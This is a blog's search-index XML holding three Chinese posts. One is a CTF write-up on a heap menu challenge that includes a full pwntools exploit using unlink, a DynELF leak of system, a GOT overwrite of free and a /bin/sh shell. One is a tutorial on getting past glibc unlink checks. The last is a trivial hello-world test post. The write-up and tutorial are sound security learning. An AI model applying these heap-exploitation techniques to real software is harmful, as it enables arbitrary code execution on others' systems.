<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。 123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit 程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125; 可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞 在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125; 释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。 在print函数中，可输出任意index的chunk，用于泄露数据。 由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读 漏洞利用 分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并 在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址 从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88 释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc 写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取 利用DynELF泄露出system函数地址 利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表 向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive() 注意 set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。 unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值 此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10) 题目链接：heap]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。 源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* Take a chunk off a bin list */// unlink p#define unlink(AV, P, BK, FD) &#123; // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd; BK = P-&gt;bk; // 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。 if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; // 下面主要考虑 P 对应的 nextsize 双向链表的修改 if (!in_smallbin_range (chunksize_nomask (P)) // 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。 // 那么其实也就没有必要对 nextsize 字段进行修改了。 // 这里没有去判断 bk_nextsize 字段，可能会出问题。 &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123; // 类似于小的 chunk 的检查思路 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, "corrupted double-linked list (not small)", P, AV); // 这里说明 P 已经在 nextsize 链表中了。 // 如果 FD 没有在 nextsize 链表中 if (FD-&gt;fd_nextsize == NULL) &#123; // 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P // 令 FD 为 nextsize 串起来的 if (P-&gt;fd_nextsize == P) FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; else &#123; // 否则我们需要将 FD 插入到 nextsize 形成的双链表中 FD-&gt;fd_nextsize = P-&gt;fd_nextsize; FD-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;fd_nextsize-&gt;bk_nextsize = FD; P-&gt;bk_nextsize-&gt;fd_nextsize = FD; &#125; &#125; else &#123; // 如果在的话，直接拿走即可 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; &#125; &#125; &#125; &#125; 其中主要关注这部分：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125; 要利用该漏洞，先要绕过其中的if检查（64位为例）第一处检查chunksize(P) != prev_size (next_chunk(P))需要构造好下一相邻chunk的presize第二处检查：12345678P-&gt;bk-&gt;fd == P // *(P+0x18)+0x10 == P// =&gt; *(P+0x18) = P-0x10 // =&gt; P-&gt;bk == P-0x10// =&gt; BK == P-0x10P-&gt;fd-&gt;bk == P // *(P+0x10)+0x18 == P// =&gt; *(P+0x10) = P-0x18// =&gt; P-&gt;fd == P-0x18// =&gt; FD == p-0x18 可以看出，只要在fd处放入P-0x18，在bk处放入P-0x10即可绕过检查。绕过检查后：12FD-&gt;bk = BK; // *(FD+0x18) = P-0x10BK-&gt;fd = FD; // *(BK+0x10) = P-0x18 =&gt; *P = P-0x18 在此之后，P就指向了比自己低0x18个字节的地址，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。 触发前提 堆指针是全局变量，或其地址是可泄露的 能够free一个smallchunk(可以是伪造的)(largebin增加对fd_nextsize和bk_nextsize检查，unsortedbin没有检查) 能够控制下一chunk的prevsize和size 利用过程（64位为例）法一存在堆溢出时： 分配连续3个chunk a, b, c 在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding 覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90) free掉b，触发unlink 写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr) 再次写入a，任意地址写入 法二不能溢出，但有double free 分配连续3个fastchunk a, b, c 释放a，此时并不会修改后面的inuse位和prevsize 申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改 触发double free，将a再次释放，放入fastbin 再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse 布置a内存，释放b，触发unlink 题目 一道典型的unlink例题]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
